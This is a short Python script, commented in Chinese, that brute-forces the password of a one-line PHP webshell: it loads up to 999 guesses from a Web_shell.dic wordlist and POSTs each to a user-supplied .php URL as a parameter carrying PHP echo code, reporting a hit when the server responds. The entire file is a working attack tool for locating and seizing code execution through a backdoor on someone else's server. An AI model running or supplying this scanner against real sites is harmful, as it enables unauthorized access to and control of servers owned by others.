# 对.php结尾的文件进行一句话爆破
import os
import sys

from crawl import HtmlCrawl

filename = os.path.join(sys.path[0], "../data", "Web_shell.dic")
payload = []
f = open(filename)
a = 0
for i in f:
    payload.append(i.strip())
    a += 1
    if (a == 999):
        break


class Spider:
    def run(self, url):
        if (not url.endswith(".php")):
            return "Webshell may not exist: %s" % url
        post_data = {}
        for _payload in payload:
            post_data[_payload] = 'echo "password is %s";' % _payload
            r = HtmlCrawl.post(url, post_data)
            if (r):
                print("Webshell:%s" % r)
                return True
        return "Webshell may not exist: %s" % url


if __name__ == "__main__":
    url = input("请输入目标URL：")
    a = Spider()
    c = a.run(url)
